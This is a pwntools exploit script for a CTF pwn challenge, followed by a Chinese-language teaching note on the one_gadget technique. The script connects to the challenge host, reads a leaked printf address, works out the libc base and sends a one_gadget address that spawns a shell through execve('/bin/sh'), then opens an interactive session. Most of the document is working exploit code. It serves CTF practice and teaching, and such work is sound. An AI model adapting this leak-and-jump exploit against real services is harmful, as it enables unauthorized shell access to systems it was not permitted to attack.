from pwn import *

# context(arch = 'amd64',os = 'linux',log_level = 'debug')

p = remote('pwn.challenge.ctf.show', 28122)
libc = ELF('libc.so.6')
one_gadget = 0x10a2fc

p.recvuntil('this:')
print_addr = int(p.recv(14), 16)

libcbase = print_addr - libc.sym['printf']

payload = one_gadget + libcbase

p.sendline(str(payload))

p.interactive()

"""
【知识点讲解】
1. 题目类型：one_gadget - 一键getshell
2. 核心原理：
   - libc中存在现成的execve("/bin/sh")代码片段
   - 只需满足特定约束条件，跳转到该地址即可
   - 不需要构造ROP链调用system
3. one_gadget工具：
   - 自动搜索libc中的one_gadget
   - 显示每个gadget的地址和约束条件
   - 约束条件通常是某些寄存器或栈内容为0
4. 使用方法：
   - 泄露libc地址，计算libc基址
   - 使用one_gadget查找gadget地址
   - 跳转到gadget地址执行
5. 注意：需要满足gadget的约束条件
"""
